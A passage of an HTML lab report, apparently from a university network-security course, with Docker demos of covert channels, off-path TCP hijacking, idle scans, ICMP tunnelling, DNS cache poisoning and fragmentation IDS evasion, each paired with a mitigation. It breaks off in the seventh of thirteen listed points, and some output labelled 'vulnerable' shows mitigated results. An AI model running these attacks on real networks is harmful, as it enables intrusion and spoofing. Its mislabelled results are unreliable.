@@ -1,0 +1,1208 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Taller 2 — Informe de Vulnerabilidades TCP/IP</title>
+<style>
+:root { --bg:#0f1117; --card:#1a1d27; --text:#e6e8ec; --muted:#9aa3b2; --accent:#6ea8fe; --ok:#3dd68c; --fail:#f07178; }
+* { box-sizing:border-box; }
+body { margin:0; font-family:Segoe UI, system-ui, sans-serif; background:var(--bg); color:var(--text); line-height:1.55; }
+header { padding:2rem; background:linear-gradient(135deg,#1e3a5f,#0f1117); border-bottom:1px solid #2a3142; }
+header h1 { margin:0 0 .5rem; font-size:1.8rem; }
+header p { margin:.25rem 0; color:var(--muted); }
+main { max-width:1200px; margin:0 auto; padding:1.5rem; }
+nav { background:var(--card); padding:1rem 1.5rem; border-radius:10px; margin-bottom:2rem; }
+nav ul { columns:2; margin:0; padding-left:1.2rem; }
+nav a { color:var(--accent); text-decoration:none; }
+.badge { font-size:.75rem; padding:.1rem .45rem; border-radius:4px; margin-left:.3rem; }
+.badge.ok { background:#1a3d2e; color:var(--ok); }
+.badge.fail { background:#3d1a1f; color:var(--fail); }
+.lab-section { background:var(--card); border-radius:12px; padding:1.5rem; margin-bottom:2rem; border:1px solid #2a3142; }
+.lab-section h2 { margin-top:0; color:var(--accent); border-bottom:1px solid #2a3142; padding-bottom:.5rem; }
+.meta { display:flex; flex-wrap:wrap; gap:1rem; color:var(--muted); font-size:.9rem; margin-bottom:1rem; }
+.compare { display:grid; grid-template-columns:1fr 1fr; gap:1rem; margin:1rem 0; }
+.shot img { max-width:100%; border:1px solid #333; border-radius:6px; background:#000; }
+.shot.missing { padding:2rem; text-align:center; color:var(--muted); border:1px dashed #444; border-radius:6px; }
+.explain-grid { display:grid; grid-template-columns:1fr 1fr; gap:1rem; }
+pre { background:#0a0c10; padding:1rem; border-radius:8px; overflow:auto; font-size:.85rem; }
+footer { text-align:center; padding:2rem; color:var(--muted); font-size:.85rem; }
+@media (max-width:800px) { .compare, .explain-grid, nav ul { columns:1; grid-template-columns:1fr; } }
+</style>
+</head>
+<body>
+<header>
+  <h1>Taller 2 — Auditoría de Vulnerabilidades TCP/IP</h1>
+  <p>Universidad Nacional de Colombia · Facultad de Ingeniería · 2026-1S</p>
+  <p>Informe generado: 2026-06-08T17:50:44.420421+00:00</p>
+</header>
+<main>
+<nav><h3>Índice</h3><ul><li><a href="#punto-01">Punto 01 — Canales Encubiertos en Cabeceras TCP/IP</a> <span class="badge ok">OK</span></li><li><a href="#punto-02">Punto 02 — Timing Covert Channels</a> <span class="badge ok">OK</span></li><li><a href="#punto-03">Punto 03 — TCP Session Hijacking Off-Path</a> <span class="badge ok">OK</span></li><li><a href="#punto-04">Punto 04 — Idle Scan / Zombie Scan</a> <span class="badge ok">OK</span></li><li><a href="#punto-05">Punto 05 — Tunelización ICMP</a> <span class="badge ok">OK</span></li><li><a href="#punto-06">Punto 06 — DNS Cache Poisoning</a> <span class="badge ok">OK</span></li><li><a href="#punto-07">Punto 07 — Evasión IDS por Fragmentación IP</a> <span class="badge ok">OK</span></li><li><a href="#punto-08">Punto 08 — Ataques Off-Path con ICMP Forjado</a> <span class="badge ok">OK</span></li><li><a href="#punto-09">Punto 09 — Low-Rate Denial of Service (LDoS)</a> <span class="badge ok">OK</span></li><li><a href="#punto-10">Punto 10 — Exfiltración Lenta por DNS</a> <span class="badge ok">OK</span></li><li><a href="#punto-11">Punto 11 — ARP Spoofing Silencioso</a> <span class="badge ok">OK</span></li><li><a href="#punto-12">Punto 12 — Downgrade Attacks TLS/SSH</a> <span class="badge ok">OK</span></li><li><a href="#punto-13">Punto 13 — Ataques Low-and-Slow (Slowloris)</a> <span class="badge ok">OK</span></li></ul></nav>
+
+<section id="punto-01" class="lab-section">
+  <h2>Punto 01 — Canales Encubiertos en Cabeceras TCP/IP</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> IP / TCP</span>
+    <span><strong>Capa:</strong> Internet / Transporte</span>
+    <span><strong>Criticidad:</strong> Medio-Bajo</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Manipulación maliciosa de campos de cabecera (IP ID, ISN, TTL) para transmitir datos ocultos sin alterar la carga útil visible.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Emisor 10.9.0.101 codifica mensaje en IP ID; receptor 10.9.0.102 decodifica con Scapy.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>Normalización de cabeceras: ISN pseudoaleatorio (RFC 6528) y IP ID secuencial limpio en el receptor.</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-01-vulnerable.png" target="_blank"><img src="assets/punto-01-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-01-mitigado.png" target="_blank"><img src="assets/punto-01-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>El receptor extrae el mensaje oculto codificado en el campo IP ID de los paquetes ICMP/TCP enviados por el emisor.</p></div>
+    <div><h4>Mitigado</h4><p>Tras aplicar normalización de cabeceras, el campo IP ID ya no conserva el mensaje codificado; la extracción falla o devuelve ruido.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>docker compose up --build &amp;&amp; docker compose exec emisor python3 /lab/encode_headers.py 10.9.0.102 SECRETO</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre>moved intermediate container 2669794e8e6a
+ ---&gt; 67be9d28ac1e
+Step 5/7 : COPY scripts/ /lab/
+ ---&gt; 9cbba98b6973
+Step 6/7 : CMD [&quot;sleep&quot;, &quot;infinity&quot;]
+ ---&gt; e7d1b6310e3e
+Step 6/7 : CMD [&quot;sleep&quot;, &quot;infinity&quot;]
+ ---&gt; Running in 0eb5034e2e3c
+ ---&gt; Running in b245c3c0ef54
+ ---&gt; Removed intermediate container 0eb5034e2e3c
+ ---&gt; d2f88e3b0bcf
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Removed intermediate container b245c3c0ef54
+ ---&gt; 88157549615a
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Running in 622a30ce3079
+ ---&gt; Running in 730626262d27
+ ---&gt; Removed intermediate container 622a30ce3079
+ ---&gt; 59dfd6c89fe0
+Successfully built 59dfd6c89fe0
+ ---&gt; Removed intermediate container 730626262d27
+ ---&gt; f5f927642910
+Successfully tagged p01v-receptor:latest
+ Image p01v-receptor Built 
+ Image p01v-receptor Built 
+Successfully built f5f927642910
+Successfully tagged p01v-emisor:latest
+ Image p01v-emisor Built 
+ Image p01v-emisor Built 
+ Network p01v_labnet Creating 
+ Network p01v_labnet Created 
+ Container p01v-emisor-1 Creating 
+ Container p01v-receptor-1 Creating 
+ Container p01v-receptor-1 Created 
+ Container p01v-emisor-1 Created 
+ Container p01v-receptor-1 Starting 
+ Container p01v-emisor-1 Starting 
+ Container p01v-emisor-1 Started 
+ Container p01v-receptor-1 Started 
+[+] Codificando &#x27;SECRETO&#x27; en IP ID hacia 10.9.0.102
+    paquete 0: IP ID=21248 char=&#x27;S&#x27;
+    paquete 1: IP ID=17665 char=&#x27;E&#x27;
+    paquete 2: IP ID=17154 char=&#x27;C&#x27;
+    paquete 3: IP ID=20995 char=&#x27;R&#x27;
+    paquete 4: IP ID=17668 char=&#x27;E&#x27;
+    paquete 5: IP ID=21509 char=&#x27;T&#x27;
+    paquete 6: IP ID=20230 char=&#x27;O&#x27;
+[+] Transmisión encubierta completada
+ Container p01v-receptor-1 Stopping 
+ Container p01v-emisor-1 Stopping 
+ Container p01v-emisor-1 Stopped 
+ Container p01v-emisor-1 Removing 
+ Container p01v-receptor-1 Stopped 
+ Container p01v-receptor-1 Removing 
+ Container p01v-receptor-1 Removed 
+ Container p01v-emisor-1 Removed 
+ Network p01v_labnet Removing 
+ Network p01v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-02" class="lab-section">
+  <h2>Punto 02 — Timing Covert Channels</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> TCP / UDP</span>
+    <span><strong>Capa:</strong> Transporte</span>
+    <span><strong>Criticidad:</strong> Bajo</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Modulación de intervalos entre paquetes (IPD) para transmitir bits sin modificar cabeceras ni payload.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Emisor 10.9.0.101 envía ICMP con retardo corto/largo; receptor 10.9.0.102 mide tiempos.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>Jammer con tc netem que añade jitter uniforme destruyendo la señal temporal.</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-02-vulnerable.png" target="_blank"><img src="assets/punto-02-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-02-mitigado.png" target="_blank"><img src="assets/punto-02-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>El receptor decodifica correctamente la secuencia de bits a partir de los intervalos entre paquetes.</p></div>
+    <div><h4>Mitigado</h4><p>Con jitter activo en el gateway, la decodificación por temporización produce errores o secuencia inválida.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>docker compose exec emisor python3 /lab/timing_send.py 10.9.0.102 1010</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre>finity&quot;]
+ ---&gt; Using cache
+ ---&gt; dff87a52be11
+Step 6/7 : CMD [&quot;sleep&quot;, &quot;infinity&quot;]
+ ---&gt; Using cache
+ ---&gt; 2cd9f33c5292
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; 2cd9f33c5292
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; ee05f1ebc0f0
+ ---&gt; Using cache
+ ---&gt; ee05f1ebc0f0
+Successfully built ee05f1ebc0f0
+Successfully built ee05f1ebc0f0
+Successfully tagged p02v-emisor:latest
+ Image p02v-emisor Built 
+ Image p02v-emisor Built 
+Successfully tagged p02v-receptor:latest
+ Image p02v-receptor Built 
+ Image p02v-receptor Built 
+ Network p02v_labnet Creating 
+ Network p02v_labnet Created 
+ Container p02v-emisor-1 Creating 
+ Container p02v-receptor-1 Creating 
+ Container p02v-emisor-1 Created 
+ Container p02v-receptor-1 Created 
+ Container p02v-emisor-1 Starting 
+ Container p02v-receptor-1 Starting 
+ Container p02v-receptor-1 Started 
+ Container p02v-emisor-1 Started 
+[+] Codificando &#x27;1010&#x27; por temporización hacia 10.9.0.102
+    paquete sync enviado
+    bit 0: 1 (retardo previo=0.8s)
+    bit 1: 0 (retardo previo=0.2s)
+    bit 2: 1 (retardo previo=0.8s)
+    bit 3: 0 (retardo previo=0.2s)
+[+] Transmisión temporal completada
+[+] Escuchando canal temporal ICMP...
+[*] Echo Request de 10.9.0.101 @ 1780941119.830
+[*] Echo Request de 10.9.0.101 @ 1780941120.648
+[*] Echo Request de 10.9.0.101 @ 1780941120.860
+[*] Echo Request de 10.9.0.101 @ 1780941121.670
+[*] Echo Request de 10.9.0.101 @ 1780941121.885
+[*] IPD[0]=0.819s -&gt; bit 1
+[*] IPD[1]=0.212s -&gt; bit 0
+[*] IPD[2]=0.810s -&gt; bit 1
+[*] IPD[3]=0.215s -&gt; bit 0
+[+] Secuencia decodificada: 1010
+[+] DECODIFICACIÓN EXITOSA: 1010
+ Container p02v-emisor-1 Stopping 
+ Container p02v-receptor-1 Stopping 
+ Container p02v-emisor-1 Stopped 
+ Container p02v-emisor-1 Removing 
+ Container p02v-receptor-1 Stopped 
+ Container p02v-receptor-1 Removing 
+ Container p02v-emisor-1 Removed 
+ Container p02v-receptor-1 Removed 
+ Network p02v_labnet Removing 
+ Network p02v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-03" class="lab-section">
+  <h2>Punto 03 — TCP Session Hijacking Off-Path</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> TCP</span>
+    <span><strong>Capa:</strong> Transporte</span>
+    <span><strong>Criticidad:</strong> Alto</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Inyección off-path de segmentos TCP aprovechando side-channels de Challenge ACK (CVE-2016-5696).</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Servidor 10.9.0.5, cliente 10.9.0.6, atacante 10.9.0.7 en red 10.9.0.0/24.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>sysctl net.ipv4.tcp_challenge_ack_limit=2147483647 en el servidor.</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-03-vulnerable.png" target="_blank"><img src="assets/punto-03-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-03-mitigado.png" target="_blank"><img src="assets/punto-03-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>El atacante detecta variaciones en Challenge ACKs al probar números de secuencia, revelando información de la sesión.</p></div>
+    <div><h4>Mitigado</h4><p>Con el límite elevado, las respuestas Challenge ACK son uniformes y el canal colateral deja de filtrar información.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>docker compose exec atacante python3 /lab/challenge_ack_probe.py 10.9.0.5 10.9.0.6</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre>9 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; 07e7eed1be01
+Step 9/9 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; 319f1294fbac
+ ---&gt; Using cache
+ ---&gt; 319f1294fbac
+Successfully built 319f1294fbac
+ ---&gt; Using cache
+ ---&gt; 319f1294fbac
+Successfully built 319f1294fbac
+Successfully built 319f1294fbac
+Successfully tagged p03v-atacante:latest
+ Image p03v-atacante Built 
+ Image p03v-atacante Built 
+Successfully tagged p03v-servidor:latest
+ Image p03v-servidor Built 
+ Image p03v-servidor Built 
+Successfully tagged p03v-cliente:latest
+ Image p03v-cliente Built 
+ Image p03v-cliente Built 
+ Network p03v_labnet Creating 
+ Network p03v_labnet Created 
+ Container p03v-servidor-1 Creating 
+ Container p03v-cliente-1 Creating 
+ Container p03v-atacante-1 Creating 
+ Container p03v-cliente-1 Created 
+ Container p03v-servidor-1 Created 
+ Container p03v-atacante-1 Created 
+ Container p03v-atacante-1 Starting 
+ Container p03v-cliente-1 Starting 
+ Container p03v-servidor-1 Starting 
+ Container p03v-cliente-1 Started 
+ Container p03v-atacante-1 Started 
+ Container p03v-servidor-1 Started 
+[*] Side-channel Challenge ACK — servidor=10.9.0.5 cliente=10.9.0.6
+[*] Sesión TCP activa en puerto 9999; enviando SYN fuera de ventana...
+    seq=   1000 -&gt; ACK
+    seq=  50000 -&gt; ACK
+    seq= 100000 -&gt; ACK
+    seq= 250000 -&gt; ACK
+    seq= 500000 -&gt; ACK
+    seq= 900000 -&gt; ACK
+[+] Distribución de respuestas: {&#x27;ACK&#x27;: 6}
+[+] Respuestas uniformes — side-channel mitigado
+ Container p03v-servidor-1 Stopping 
+ Container p03v-atacante-1 Stopping 
+ Container p03v-cliente-1 Stopping 
+ Container p03v-atacante-1 Stopped 
+ Container p03v-atacante-1 Removing 
+ Container p03v-cliente-1 Stopped 
+ Container p03v-cliente-1 Removing 
+ Container p03v-servidor-1 Stopped 
+ Container p03v-servidor-1 Removing 
+ Container p03v-atacante-1 Removed 
+ Container p03v-cliente-1 Removed 
+ Container p03v-servidor-1 Removed 
+ Network p03v_labnet Removing 
+ Network p03v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-04" class="lab-section">
+  <h2>Punto 04 — Idle Scan / Zombie Scan</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> IP / TCP</span>
+    <span><strong>Capa:</strong> Internet / Transporte</span>
+    <span><strong>Criticidad:</strong> Medio</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Escaneo ciego usando IP ID predecible de un host zombie para inferir puertos abiertos sin revelar la IP del atacante.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Atacante 10.9.0.100, zombie 10.9.0.150, objetivo 10.9.0.200.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>rp_filter=1 y descarte de paquetes con IP spoofing.</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-04-vulnerable.png" target="_blank"><img src="assets/punto-04-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-04-mitigado.png" target="_blank"><img src="assets/punto-04-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>Delta IP ID del zombie indica puerto 80 abierto en el objetivo (incremento de +1).</p></div>
+    <div><h4>Mitigado</h4><p>Con rp_filter activo, los SYN spoofed no alcanzan el objetivo y el delta IP ID no cambia.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>docker compose exec atacante python3 /lab/idle_scan.py 10.9.0.150 10.9.0.200 80</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre>---&gt; Using cache
+ ---&gt; 8b68bc3f6829
+Step 9/9 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; 8b68bc3f6829
+Step 9/9 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; 8b68bc3f6829
+Step 9/9 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; b36231048dbf
+Successfully built b36231048dbf
+ ---&gt; Using cache
+ ---&gt; b36231048dbf
+ ---&gt; Using cache
+ ---&gt; b36231048dbf
+Successfully built b36231048dbf
+Successfully built b36231048dbf
+Successfully tagged p04v-objetivo:latest
+ Image p04v-objetivo Built 
+ Image p04v-objetivo Built 
+Successfully tagged p04v-atacante:latest
+ Image p04v-atacante Built 
+ Image p04v-atacante Built 
+Successfully tagged p04v-zombie:latest
+ Image p04v-zombie Built 
+ Image p04v-zombie Built 
+ Network p04v_labnet Creating 
+ Network p04v_labnet Created 
+ Container p04v-objetivo-1 Creating 
+ Container p04v-zombie-1 Creating 
+ Container p04v-atacante-1 Creating 
+ Container p04v-objetivo-1 Created 
+ Container p04v-atacante-1 Created 
+ Container p04v-zombie-1 Created 
+ Container p04v-atacante-1 Starting 
+ Container p04v-zombie-1 Starting 
+ Container p04v-objetivo-1 Starting 
+ Container p04v-atacante-1 Started 
+ Container p04v-objetivo-1 Started 
+ Container p04v-zombie-1 Started 
+[*] Idle scan: zombie=10.9.0.150 objetivo=10.9.0.200 puerto=80
+[*] IP ID inicial del zombie: 0
+[*] SYN spoofed enviado: 10.9.0.150 -&gt; 10.9.0.200:80
+[*] IP ID final del zombie: 0
+[+] Delta IP ID: 0
+[-] Puerto 80/tcp cerrado/filtrado (delta=0)
+ Container p04v-zombie-1 Stopping 
+ Container p04v-atacante-1 Stopping 
+ Container p04v-objetivo-1 Stopping 
+ Container p04v-objetivo-1 Stopped 
+ Container p04v-objetivo-1 Removing 
+ Container p04v-atacante-1 Stopped 
+ Container p04v-atacante-1 Removing 
+ Container p04v-zombie-1 Stopped 
+ Container p04v-zombie-1 Removing 
+ Container p04v-objetivo-1 Removed 
+ Container p04v-zombie-1 Removed 
+ Container p04v-atacante-1 Removed 
+ Network p04v_labnet Removing 
+ Network p04v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-05" class="lab-section">
+  <h2>Punto 05 — Tunelización ICMP</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> ICMP</span>
+    <span><strong>Capa:</strong> Internet</span>
+    <span><strong>Criticidad:</strong> Medio</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Encapsulación de datos arbitrarios en el payload de Echo Request/Reply ICMP.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Emisor 10.9.0.101, receptor 10.9.0.102.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>iptables: DROP en Echo Request con longitud total &gt; 84 bytes.</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-05-vulnerable.png" target="_blank"><img src="assets/punto-05-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-05-mitigado.png" target="_blank"><img src="assets/punto-05-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>El receptor imprime el mensaje tunelizado recibido vía ICMP.</p></div>
+    <div><h4>Mitigado</h4><p>Paquetes ICMP con payload largo son descartados; el mensaje no llega al receptor.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>python3 send_icmp.py 10.9.0.102 &#x27;MensajeSecretoTunelizado&#x27;</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre> 8dca233de9f3
+Step 2/7 : RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends     iproute2 iputils-ping tcpdump procps     &amp;&amp; rm -rf /var/lib/apt/lists/*
+ ---&gt; Using cache
+ ---&gt; a40c36c8f93a
+Step 3/7 : RUN pip install --no-cache-dir scapy
+ ---&gt; Using cache
+ ---&gt; a40c36c8f93a
+Step 3/7 : RUN pip install --no-cache-dir scapy
+ ---&gt; Using cache
+ ---&gt; 1411ba7e8e9f
+Step 4/7 : WORKDIR /lab
+ ---&gt; Using cache
+ ---&gt; 1411ba7e8e9f
+Step 4/7 : WORKDIR /lab
+ ---&gt; Using cache
+ ---&gt; 86c388bfd53d
+Step 5/7 : COPY scripts/ /lab/
+ ---&gt; Using cache
+ ---&gt; 86c388bfd53d
+Step 5/7 : COPY scripts/ /lab/
+ ---&gt; Using cache
+ ---&gt; 7964307b8cd4
+Step 6/7 : CMD [&quot;sleep&quot;, &quot;infinity&quot;]
+ ---&gt; Using cache
+ ---&gt; 7964307b8cd4
+Step 6/7 : CMD [&quot;sleep&quot;, &quot;infinity&quot;]
+ ---&gt; Using cache
+ ---&gt; f6e1728fe5c5
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; f6e1728fe5c5
+Step 7/7 : LABEL com.docker.compose.image.builder=classic
+ ---&gt; Using cache
+ ---&gt; 2f7a9664276f
+ ---&gt; Using cache
+ ---&gt; 2f7a9664276f
+Successfully built 2f7a9664276f
+Successfully built 2f7a9664276f
+Successfully tagged p05v-emisor:latest
+ Image p05v-emisor Built 
+ Image p05v-emisor Built 
+Successfully tagged p05v-receptor:latest
+ Image p05v-receptor Built 
+ Image p05v-receptor Built 
+ Network p05v_labnet Creating 
+ Network p05v_labnet Created 
+ Container p05v-receptor-1 Creating 
+ Container p05v-emisor-1 Creating 
+ Container p05v-emisor-1 Created 
+ Container p05v-receptor-1 Created 
+ Container p05v-receptor-1 Starting 
+ Container p05v-emisor-1 Starting 
+ Container p05v-emisor-1 Started 
+ Container p05v-receptor-1 Started 
+[+] Datos transmitidos con éxito al host 10.9.0.102
+ Container p05v-receptor-1 Stopping 
+ Container p05v-emisor-1 Stopping 
+ Container p05v-emisor-1 Stopped 
+ Container p05v-emisor-1 Removing 
+ Container p05v-receptor-1 Stopped 
+ Container p05v-receptor-1 Removing 
+ Container p05v-emisor-1 Removed 
+ Container p05v-receptor-1 Removed 
+ Network p05v_labnet Removing 
+ Network p05v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-06" class="lab-section">
+  <h2>Punto 06 — DNS Cache Poisoning</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> DNS</span>
+    <span><strong>Capa:</strong> Aplicación</span>
+    <span><strong>Criticidad:</strong> Alto</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Inyección de respuestas DNS falsificadas aprovechando TXID y puerto efímero predecibles.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Resolvedor 10.9.0.53, DNS autoritativo 10.9.0.120, atacante 10.9.0.153.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>DNSSEC con dnssec-validation auto en BIND9.</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-06-vulnerable.png" target="_blank"><img src="assets/punto-06-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-06-mitigado.png" target="_blank"><img src="assets/punto-06-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>Respuesta forjada es aceptada en caché; dig devuelve IP del atacante.</p></div>
+    <div><h4>Mitigado</h4><p>Sin firmas DNSSEC válidas, el resolvedor rechaza la respuesta envenenada.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>python3 dns_poison.py rand001 &amp;&amp; dig @10.9.0.53 test.ejemplo.com</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre>+] Sonda inyectada: Puerto_Destino=16377 | TXID=50568
+[+] Sonda inyectada: Puerto_Destino=64034 | TXID=32539
+[+] Sonda inyectada: Puerto_Destino=15045 | TXID=33674
+[+] Sonda inyectada: Puerto_Destino=63551 | TXID=60322
+[+] Sonda inyectada: Puerto_Destino=43634 | TXID=49893
+[+] Sonda inyectada: Puerto_Destino=51590 | TXID=1979
+[+] Sonda inyectada: Puerto_Destino=14473 | TXID=53936
+[+] Sonda inyectada: Puerto_Destino=47759 | TXID=57647
+[+] Sonda inyectada: Puerto_Destino=18935 | TXID=64346
+[+] Sonda inyectada: Puerto_Destino=16583 | TXID=49295
+[+] Sonda inyectada: Puerto_Destino=1743 | TXID=18973
+[+] Sonda inyectada: Puerto_Destino=35184 | TXID=33276
+[+] Sonda inyectada: Puerto_Destino=3046 | TXID=13319
+[+] Sonda inyectada: Puerto_Destino=53752 | TXID=45464
+[+] Sonda inyectada: Puerto_Destino=51811 | TXID=29145
+[+] Sonda inyectada: Puerto_Destino=21397 | TXID=23180
+[+] Sonda inyectada: Puerto_Destino=35447 | TXID=29068
+[+] Sonda inyectada: Puerto_Destino=25731 | TXID=8705
+[+] Sonda inyectada: Puerto_Destino=43407 | TXID=19461
+[+] Sonda inyectada: Puerto_Destino=39959 | TXID=42320
+[+] Sonda inyectada: Puerto_Destino=32240 | TXID=11435
+[+] Sonda inyectada: Puerto_Destino=60497 | TXID=49062
+[+] Sonda inyectada: Puerto_Destino=40358 | TXID=22777
+[+] Sonda inyectada: Puerto_Destino=44216 | TXID=42755
+[+] Sonda inyectada: Puerto_Destino=51337 | TXID=44607
+[+] Sonda inyectada: Puerto_Destino=26882 | TXID=34646
+[+] Sonda inyectada: Puerto_Destino=3692 | TXID=39132
+[*] Consulta tras ataque:
+10.10.10.10
+ Container p06v-auth-1 Stopping 
+ Container p06v-atacante-1 Stopping 
+ Container p06v-resolver-1 Stopping 
+ Container p06v-auth-1 Stopped 
+ Container p06v-auth-1 Removing 
+ Container p06v-resolver-1 Stopped 
+ Container p06v-resolver-1 Removing 
+ Container p06v-auth-1 Removed 
+ Container p06v-resolver-1 Removed 
+ Container p06v-atacante-1 Stopped 
+ Container p06v-atacante-1 Removing 
+ Container p06v-atacante-1 Removed 
+ Network p06v_labnet Removing 
+ Network p06v_labnet Removed 
+</pre></details>
+</section>
+
+<section id="punto-07" class="lab-section">
+  <h2>Punto 07 — Evasión IDS por Fragmentación IP</h2>
+  <div class="meta">
+    <span><strong>Protocolo:</strong> IP</span>
+    <span><strong>Capa:</strong> Internet</span>
+    <span><strong>Criticidad:</strong> Alto</span>
+  </div>
+  <h3>Descripción de la vulnerabilidad</h3>
+  <p>Fragmentos IP con offsets solapados para evadir IDS y reensamblar payload malicioso en el objetivo.</p>
+  <h3>Escenario de laboratorio</h3>
+  <p>Atacante 10.9.0.101, objetivo 10.9.0.102.</p>
+  <h3>Mitigación aplicada</h3>
+  <p>iptables -t mangle -A PREROUTING -f -j DROP</p>
+  <div class="compare">
+    <div class="shot">
+  <h4>Estado vulnerable</h4>
+  <a href="assets/punto-07-vulnerable.png" target="_blank"><img src="assets/punto-07-vulnerable.png" alt="Estado vulnerable"/></a>
+</div>
+    <div class="shot">
+  <h4>Estado mitigado</h4>
+  <a href="assets/punto-07-mitigado.png" target="_blank"><img src="assets/punto-07-mitigado.png" alt="Estado mitigado"/></a>
+</div>
+  </div>
+  <div class="explain-grid">
+    <div><h4>Vulnerable</h4><p>El objetivo reensambla y detecta la firma maliciosa EVILPAYLOAD en UDP.</p></div>
+    <div><h4>Mitigado</h4><p>Los fragmentos IP son descartados en el firewall; no hay reensamblaje.</p></div>
+  </div>
+  <h3>Comandos de demostración</h3>
+  <pre><code>python3 fragment_attack.py 10.9.0.102</code></pre>
+  <details><summary>Salida capturada (vulnerable)</summary><pre> wget openssl     procps arping netcat-openbsd iperf3     &amp;&amp; rm -rf /var/lib/apt/lists/*
+ ---&gt; Using cache
+ ---&gt; ce8021aaf169
+Step 3/7 : RUN pip install --no-cache-dir scapy
+ ---&gt; Using cache
+ ---&gt; ce8021aaf169
